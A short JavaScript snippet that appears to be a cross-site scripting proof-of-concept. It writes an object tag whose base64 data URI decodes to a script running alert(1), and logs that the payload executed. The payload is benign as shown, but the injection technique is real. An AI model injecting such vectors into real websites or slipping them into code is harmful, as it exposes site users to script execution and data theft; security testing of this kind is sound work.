function xssPayload() {
  document.write('<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>')

}

console.log('XSS payload executed');
xssPayload();
